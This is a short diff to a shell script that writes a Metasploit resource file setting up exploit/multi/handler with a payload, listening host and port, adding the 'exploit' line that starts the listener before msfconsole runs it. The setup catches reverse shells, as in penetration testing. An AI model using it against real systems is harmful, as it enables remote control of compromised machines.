@@ -91,6 +91,7 @@ use exploit/multi/handler
 set payload $tcp
 set lhost $host
 set lport $port
+exploit
 EOF
 
 msfconsole -q -r listener.rc 
